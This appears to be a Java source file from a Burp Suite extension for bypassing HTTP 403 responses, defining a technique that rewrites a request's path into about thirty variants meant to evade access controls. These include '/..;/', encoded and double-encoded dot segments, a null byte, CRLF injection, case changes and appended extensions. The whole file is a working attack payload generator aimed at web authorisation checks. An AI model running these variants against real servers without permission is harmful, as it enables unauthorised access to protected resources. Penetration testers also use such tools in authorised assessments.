package bypass403.techniques;

import burp.api.montoya.http.message.requests.HttpRequest;
import java.util.ArrayList;
import java.util.List;

public class PathManipulationTechnique implements BypassTechnique {
    public String getName() { return "Path manipulation"; }

    public List<HttpRequest> generateCandidates(HttpRequest original) {
        String path = original.path();
        int queryIndex = path.indexOf('?');
        String base = queryIndex >= 0 ? path.substring(0, queryIndex) : path;
        String query = queryIndex >= 0 ? path.substring(queryIndex) : "";
        String stem = base.endsWith("/") ? base.substring(0, base.length() - 1) : base;
        int slash = stem.lastIndexOf('/');
        String name = slash >= 0 ? stem.substring(slash + 1) : stem;
        String parent = slash > 0 ? stem.substring(0, slash) : "";

        String[] candidates = {
            stem + "/", stem + "/.", stem + "//", stem + "/..;/", stem + "/.;/",
            "/./" + name, "//" + name, stem + "%20", stem + "%09",
            parent + "/" + name.toUpperCase(), parent + "/" + capitalize(name),
            stem + "%2f", "/%2e/" + name,
            stem + "?" + query.replaceFirst("^\\?", ""), stem + "#", stem + ";", stem + "/..",
            stem + "%2e%2e", stem + "%252e%252e", stem + "/..%2f",
            stem + "%uff0e%uff0e", stem + "%00", stem + "%0d%0a", stem + ".json",
            stem + ".html", stem + ".php", stem + "~", stem + "%23", stem + "%3f", stem + "*",
            "/%2f" + name, stem + "%2f"
        };

        ArrayList<HttpRequest> out = new ArrayList<>();
        for (String candidate : candidates) {
            out.add(original.withPath(candidate));
        }
        return out;
    }

    private String capitalize(String value) {
        if (value.isEmpty()) return value;
        return Character.toUpperCase(value.charAt(0)) + value.substring(1).toLowerCase();
    }
}
